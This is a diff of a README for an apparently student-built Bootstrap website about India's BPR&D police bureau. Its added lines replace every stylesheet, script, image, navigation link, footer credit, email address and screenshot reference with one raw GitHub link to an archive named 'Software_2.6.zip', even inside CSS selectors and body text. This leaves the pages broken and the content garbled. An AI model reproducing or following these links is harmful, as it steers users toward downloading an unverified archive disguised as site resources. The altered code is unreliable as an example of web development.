@@ -44,14 +44,14 @@ Publish the website in the given URL.
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bootstrap Website</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
-<link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-  <link href="./vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
-  <link href="./vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
-  <link href="./vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
-  <link href="./vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
-  <link href="./css/style.css" rel="stylesheet">
+    <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+<script src="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+<link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
 <style>
     .nav-tabs
  {
@@ -65,9 +65,9 @@ Publish the website in the given URL.
     color:#fff;
     }
 
-.nav-tabs > li.active > a,
-.nav-tabs > li.active > a:focus,
-.nav-tabs > li.active > a:hover{
+.nav-tabs > https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip > a,
+.nav-tabs > https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip > a:focus,
+.nav-tabs > https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip > a:hover{
     background-color:#D6E6F3;
     color:#000;
     border: 1px solid #b05fe6;
@@ -88,7 +88,7 @@ Publish the website in the given URL.
 <body>
     <div class="container">
         <div class="row">
-            <img src="./img/one.jpg"   style="height:300px;"  alt="police">
+            <img src="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip"   style="height:300px;"  alt="police">
             <nav class="navbar navbar-expand-sm bg-light navbar-light">
                 <div class="container">
 
@@ -107,16 +107,16 @@ Publish the website in the given URL.
                       </form>
                 </div>
               </nav>
-            <div class="col-sm-2 h2  bg-danger "><a href="/static/homepage.html">HOME</a></div>
-            <div class="col-sm-2 h2  bg-danger"><a href="/static/aboutus.html">ABOUT US</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/pagethree.html">GALLERY</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/pagefour.html">TRAINING</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/pagefive.html">ADMIN</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/contactus.html">CONTACT US</a></div>
+            <div class="col-sm-2 h2  bg-danger "><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">HOME</a></div>
+            <div class="col-sm-2 h2  bg-danger"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">ABOUT US</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">GALLERY</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">TRAINING</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">ADMIN</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">CONTACT US</a></div>
             <table class="table">
                 <thead>
                     <tr>
-                        <th  class="h4 bg-secondary" scope="col">S.No</th>
+                        <th  class="h4 bg-secondary" scope="col">https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip</th>
                         <th class="h4 bg-secondary" scope="col">About Us</th>
                     </tr>
                 <tbody>
@@ -157,7 +157,7 @@ Publish the website in the given URL.
                 &copy; Copyright <strong><span>BPRD</span></strong>. All Rights Reserved
               </div>
               <div class="credits">
-                Designed by <a href="https://bootstrapmade.com/">kiran</a>
+                Designed by <a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">kiran</a>
               </div>
             </div>
           </footer><!-- End Footer -->
@@ -178,14 +178,14 @@ Publish the website in the given URL.
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bootstrap Website</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
-<link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-  <link href="./vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
-  <link href="./vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
-  <link href="./vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
-  <link href="./vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
-  <link href="./css/style.css" rel="stylesheet">
+    <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+<script src="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+<link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
 <style>
     .nav-tabs
  {
@@ -199,9 +199,9 @@ Publish the website in the given URL.
     color:#fff;
     }
 
-.nav-tabs > li.active > a,
-.nav-tabs > li.active > a:focus,
-.nav-tabs > li.active > a:hover{
+.nav-tabs > https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip > a,
+.nav-tabs > https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip > a:focus,
+.nav-tabs > https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip > a:hover{
     background-color:#D6E6F3;
     color:#000;
     border: 1px solid #b05fe6;
@@ -222,7 +222,7 @@ Publish the website in the given URL.
 <body>
     <div class="container">
         <div class="row">
-            <img src="./img/one.jpg"   style="height:300px;"  alt="police">
+            <img src="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip"   style="height:300px;"  alt="police">
             <nav class="navbar navbar-expand-sm bg-light navbar-light">
                 <div class="container">
 
@@ -241,18 +241,18 @@ Publish the website in the given URL.
                       </form>
                 </div>
               </nav>
-            <div class="col-sm-2 h2  bg-danger "><a href="/static/homepage.html">HOME</a></div>
-            <div class="col-sm-2 h2  bg-danger"><a href="/static/aboutus.html">ABOUT US</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/pagethree.html">GALLERY</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/pagefour.html">TRAINING</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/pagefive.html">ADMIN</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/contactus.html">CONTACT US</a></div>
+            <div class="col-sm-2 h2  bg-danger "><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">HOME</a></div>
+            <div class="col-sm-2 h2  bg-danger"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">ABOUT US</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">GALLERY</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">TRAINING</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">ADMIN</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">CONTACT US</a></div>
             <div class="bg-danger">
             <!-- ======= Top Bar ======= -->
   <section id="topbar" class="d-flex align-items-center">
     <div class="container d-flex justify-content-center justify-content-md-between">
       <div class="contact-info d-flex align-items-center">
-        <i class="bi bi-envelope-fill"></i><a href="mailto:dg.brpd.nic.in">dg.brpd.nic.in</a>
+        <i class="bi bi-envelope-fill"></i><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip</a>
         <i class="bi bi-phone-fill phone-icon"></i>+91-11-26781312
       </div>
       <div class="social-links d-none d-md-block">
@@ -270,10 +270,10 @@ Publish the website in the given URL.
       
       <nav id="navbar" class="navbar">
         <ul>
-          <li><a class="nav-link scrollto active" href="./index.html">Home</a></li>
-          <li class="dropdown"><a href="./aboutus.html"><span>About Us</span> <i class="bi bi-chevron-down"></i></a>
+          <li><a class="nav-link scrollto active" href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">Home</a></li>
+          <li class="dropdown"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip"><span>About Us</span> <i class="bi bi-chevron-down"></i></a>
             <ul>
-              <li><a href="./aboutus.html">Evolution of BPRD</a></li>
+              <li><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">Evolution of BPRD</a></li>
               <li><a href="#">Awards/Medals</a></li>
               <li><a href="#">Work Allocation</a></li>
               <li class="dropdown"><a href="#"><span>View More</span> <i class="bi bi-chevron-right"></i></a>
@@ -285,12 +285,12 @@ Publish the website in the given URL.
                 </ul>
               </li>
             </ul>
-            <li class="dropdown"><a href="./spc.html"><span>SPC</span> <i class="bi bi-chevron-down"></i></a>
+            <li class="dropdown"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip"><span>SPC</span> <i class="bi bi-chevron-down"></i></a>
               <ul>
-                <li><a href="./spc.html">Student Police Cadet Programme</a></li>
+                <li><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">Student Police Cadet Programme</a></li>
                 <li><a href="#">SPC Web</a></li>
               </ul>
-          <li><a class="nav-link scrollto " href="./index.html#portfolio">Gallery</a></li>
+          <li><a class="nav-link scrollto " href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">Gallery</a></li>
           <li><a class="nav-link scrollto" href="#team">Training</a></li>
           <li class="dropdown"><a href="#"><span>View More</span> <i class="bi bi-chevron-down"></i></a>
             <ul>
@@ -304,7 +304,7 @@ Publish the website in the given URL.
               <li><a href="#">DOPO</a></li>
             </ul>
           </li>
-          <li><a class="getstarted scrollto" href="./index.html#contact">Contact</a></li>
+          <li><a class="getstarted scrollto" href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">Contact</a></li>
         </ul>
         <i class="bi bi-list mobile-nav-toggle"></i>
       </nav><!-- .navbar -->
@@ -336,7 +336,7 @@ Publish the website in the given URL.
           <p class="fst-italic">
               <dl>
                 <dt>CREATION</dt>
-                <br>1.The Government of India vied Resolution No.8/136/68-P.I (Pers.I) dated 28.08.1970 formally established the Bureau of Police Research and Development (BPR&D), under the Ministry of Home Affairs giving a new orientation to then existing Police Research and Advisory Council (1966) for the following reasons and with the primary objective of modernization of police force:
+                <br>https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip Government of India vied Resolution No.8/136/68-P.I (Pers.I) dated 28.08.1970 formally established the Bureau of Police Research and Development (BPR&D), under the Ministry of Home Affairs giving a new orientation to then existing Police Research and Advisory Council (1966) for the following reasons and with the primary objective of modernization of police force:
                 <dd>1.1. To take direct and active interest in the issues</dd>
                 <dd>1.2. To promote a speedy and systematic study of the police problems,</dd>
                 <dd>1.3. To apply science and technology in the methods and techniques used by police.</dd>
@@ -349,7 +349,7 @@ Publish the website in the given URL.
                 <dd>2.5. Further in 1995 Government of India decided to entrust issues relating to Correctional Administration Work to the BPR&D so that problems relating to prisons and implementation of deemed prison reforms can be taken up by the Bureau in a cohesive manner. This set up is operating out of the existing manpower resources.</dd>
                 <dd>2.6. During the year 2008, the Government of India further decided to create National Police Mission under the administrative control of BPR&D to transform the police forces in the country into effective instrument for maintenance of internal security and facing the challenges in future, by equipping them with the necessary material, intellectual and organizational resources.</dd>
                 <dt>SEPARATION</dt>
-                <br>1.Though the Institute of Criminology and Forensic Science (ICFS) was established under the overall supervision and guidance of BPR&D as part of the same exercise, it was allowed to function as a separate entity in 1976; since the ultimate objective of setting up the Institute was to develop a full-fledged academic institution for furthering studies in Criminology and forensic science. The same which has been re-christened in the year 1991 is now functioning as Lok Nayak Jai Prakash Narayan (LNJN), National Institute of Criminology and Forensic Science from 1982. The institute provides training courses for officers of the criminal justice system in the two subjects i.e. Criminology and Forensic Science and carries out research.
+                <br>https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip the Institute of Criminology and Forensic Science (ICFS) was established under the overall supervision and guidance of BPR&D as part of the same exercise, it was allowed to function as a separate entity in 1976; since the ultimate objective of setting up the Institute was to develop a full-fledged academic institution for furthering studies in Criminology and forensic science. The same which has been re-christened in the year 1991 is now functioning as Lok Nayak Jai Prakash Narayan (LNJN), National Institute of Criminology and Forensic Science from 1982. The institute provides training courses for officers of the criminal justice system in the two subjects i.e. Criminology and Forensic Science and carries out research.
                 <dd>2. Growth dynamics took over and the need to specialize in each area arose. The National Police Commission (1977) also recommended certain measures requiring implementation. Simultaneously, technological innovations particularly computers held promises of support to many areas of crime control and crime detection besides processing statistical data for the purpose of analysis. The Government of India, therefore, decided to establish a National Crime Records Bureau in 1986 build another Resolution and entrusted statistics and publications work of the Research Division to the newly constituted Bureau along with the plans for their computerization.</dd>
                 <dd>3. In an identical move brought about by compulsions of growth, the Government of India decided to give an independent status to the Forensic Science Division by creating a Forensic Science Directorate having an autonomous status under the direct control of the Ministry of Home Affairs.</dd>
               </dl>
@@ -375,7 +375,7 @@ Publish the website in the given URL.
         &copy; Copyright <strong><span>BPRD</span></strong>. All Rights Reserved
       </div>
       <div class="credits">
-        Designed by <a href="https://bootstrapmade.com/">kiran</a>
+        Designed by <a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">kiran</a>
       </div>
     </div>
   </footer><!-- End Footer -->
@@ -396,14 +396,14 @@ Publish the website in the given URL.
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bootstrap Website</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
-<link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-  <link href="./vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
-  <link href="./vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
-  <link href="./vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
-  <link href="./vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
-  <link href="./css/style.css" rel="stylesheet">
+    <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+<script src="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+<link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip" rel="stylesheet">
 <style>
     .nav-tabs
  {
@@ -417,9 +417,9 @@ Publish the website in the given URL.
     color:#fff;
     }
 
-.nav-tabs > li.active > a,
-.nav-tabs > li.active > a:focus,
-.nav-tabs > li.active > a:hover{
+.nav-tabs > https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip > a,
+.nav-tabs > https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip > a:focus,
+.nav-tabs > https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip > a:hover{
     background-color:#D6E6F3;
     color:#000;
     border: 1px solid #b05fe6;
@@ -440,7 +440,7 @@ Publish the website in the given URL.
 <body>
     <div class="container">
         <div class="row">
-            <img src="./img/one.jpg"   style="height:300px;"  alt="police">
+            <img src="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip"   style="height:300px;"  alt="police">
             <nav class="navbar navbar-expand-sm bg-light navbar-light">
                 <div class="container">
 
@@ -459,12 +459,12 @@ Publish the website in the given URL.
                       </form>
                 </div>
               </nav>
-            <div class="col-sm-2 h2  bg-danger "><a href="/static/homepage.html">HOME</a></div>
-            <div class="col-sm-2 h2  bg-danger"><a href="/static/aboutus.html">ABOUT US</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/pagethree.html">GALLERY</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/pagefour.html">TRAINING</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/pagefive.html">ADMIN</a></div>
-            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="/static/contactus.html">CONTACT US</a></div>
+            <div class="col-sm-2 h2  bg-danger "><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">HOME</a></div>
+            <div class="col-sm-2 h2  bg-danger"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">ABOUT US</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">GALLERY</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">TRAINING</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">ADMIN</a></div>
+            <div class="col-sm-2 h2  bg-danger bg-gradient"><a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">CONTACT US</a></div>
             <h2 class="text-center bg-warning">Contact Us</h2>
             <div class="h2 bg-info" style="height:1000px;">
                 Address:</br>
@@ -493,7 +493,7 @@ Publish the website in the given URL.
                 &copy; Copyright <strong><span>BPRD</span></strong>. All Rights Reserved
               </div>
               <div class="credits">
-                Designed by <a href="https://bootstrapmade.com/">kiran</a>
+                Designed by <a href="https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip">kiran</a>
               </div>
             </div>
           </footer><!-- End Footer -->
@@ -507,13 +507,13 @@ Publish the website in the given URL.
 
 
 ### Home Page:
-![output](home.png)
+![output](https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip)
 
 ### about us page:
-![output](aboutus.png)
+![output](https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip)
 
 ### contact us page:
-![output](contactus.png)
+![output](https://raw.githubusercontent.com/kiran03-jagadeesh/bootstrapwebsite/main/bprdwebsite/static/Software_2.6.zip)
 
 
 
